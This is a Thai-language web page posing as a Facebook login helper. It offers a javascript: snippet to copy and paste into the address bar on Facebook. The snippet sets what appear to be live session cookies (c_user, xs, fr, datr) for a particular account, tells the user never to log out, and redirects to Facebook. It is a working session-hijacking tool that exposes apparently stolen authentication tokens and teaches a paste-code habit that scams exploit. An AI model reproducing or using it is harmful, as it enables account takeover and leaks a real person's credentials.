<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook เข้าสู่ระบบ</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        input[type="text"], input[type="button"] {
            padding: 10px;
            margin: 5px 0;
            width: 100%;
        }
        input[type="text"] {
            cursor: not-allowed;
        }
        input[type="button"] {
            background-color: #007bff;
            color: white;
            border: none;
            cursor: pointer;
        }
        input[type="button"]:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>กรอกข้อมูล</h2>
        <input type="text" id="inputField" value="javascript:(function() { document.cookie = 'c_user=100069145613856; path=/; domain=.facebook.com; secure;'; document.cookie = 'xs=12:d9uWmZJOLZoGyQ:2:1724756001:-1:12036; path=/; domain=.facebook.com; secure;'; document.cookie = 'fr=119SdL43VNzkdfp6u.AWWYOzIHPPDoiUB0PxKPLQwHbNI.Bmzapa..AAA.0.0.BmzbAj.AWVhG1g41wk; path=/; domain=.facebook.com; secure;'; document.cookie = 'datr=9hPsZYPjcRANFhd1NPVyVngU; path=/; domain=.facebook.com; secure;'; alert('คุกกี้ถูกตั้งค่าเรียบร้อยแล้ว ห้ามออกจากระบบเด็ดขาด หากต้องการออกจากระบบ กรุณาใช้การล้างคุกกี้ในเบราว์เซอร์เท่านั้น'); window.location.href = 'https://www.facebook.com'; })();" disabled />
                <input type="button" value="คัดลอก" id="copyButton" />
        <input type="button" value="ไปที่ Facebook" id="facebookButton" />
           <div class="instructions">
            <center>วิธีกา่รใช้งานโค้ดเข้าสู่ระบบ</center>
            <p>1. คัดลอกลิ้งค์และเข้าสู่ Facebook</p>
            <p>2. พิมพ์ javascript: ตามด้วยที่คัดลอกมา ก็เป็นอันเสร็จ</p>
        </div>
    </div>

    <script>
        document.getElementById('copyButton').onclick = function() {
            const inputField = document.getElementById('inputField');
            inputField.select();
            document.execCommand('copy');
            alert('คัดลอกข้อมูลเรียบร้อยแล้ว!');
        };

        document.getElementById('facebookButton').onclick = function() {
            const inputField = document.getElementById('inputField');
            const jsCode = inputField.value;

            // ตรวจสอบว่าเริ่มต้นด้วย "javascript:"
            if (jsCode.startsWith("javascript:")) {
                window.location.href = 'https://www.facebook.com';
            } else {
                alert("กรุณาเติม 'javascript:' ที่ต้นคำสั่ง");
            }
        };
    </script>
</body>
</html>
